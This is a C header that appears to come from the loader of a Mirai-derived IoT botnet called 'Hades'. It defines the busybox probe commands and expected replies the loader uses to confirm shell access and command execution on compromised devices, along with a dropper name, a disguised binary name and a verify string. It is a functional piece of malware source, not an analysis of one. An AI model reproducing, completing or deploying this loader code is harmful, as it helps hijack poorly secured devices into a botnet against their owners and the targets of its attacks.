#pragma once

#include <stdint.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define LOADER_LITTLE_ENDIAN

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

#define VERIFY_STRING_HEX   "\\x48\\x61\\x64\\x65\\x73"
#define VERIFY_STRING_CHECK "Hades"

#define TOKEN_QUERY     "/bin/busybox Hades"
#define TOKEN_RESPONSE  "Hades: applet not found"

#define EXEC_QUERY     "/bin/busybox Hades2"
#define EXEC_RESPONSE  "Hades2: applet not found"

#define FN_DROPPER  "dropHades"
#define FN_BINARY   "fxlyazsxhy"

extern char *id_tag;
